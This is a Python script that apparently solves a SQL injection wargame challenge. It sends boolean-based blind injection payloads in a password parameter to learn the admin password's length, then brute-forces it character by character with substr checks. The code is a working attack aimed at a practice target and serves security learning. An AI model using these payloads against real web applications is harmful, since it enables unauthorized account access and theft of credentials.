from string import ascii_lowercase, digits
from requests import get

cookies = {"PHPSESSID": "응애"}
target = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?"
total = list(ascii_lowercase + digits)


def send_query(query: str) -> bool:
    resp = get(url=target, params={"pw": query}, cookies=cookies)
    if "Hello admin" in resp.text:
        return True
    return False


def guess_index():
    index = 1
    while True:
        query = f"' or id='admin' and length(pw)={index} #"
        if send_query(query):
            print(f"Found Index: {index}")
            return index
        index += 1


def brute_attack_idx(index: int) -> str:
    for letter in total:
        query = f"' or id='admin' and substr(pw,{index},1)='{letter}' #"
        if send_query(query):
            print(f"{index} => {letter}")
            return letter


if __name__ == "__main__":
    password = ""
    index = guess_index()
    for i in range(1, index + 1):
        password += brute_attack_idx(i)

    print(password)
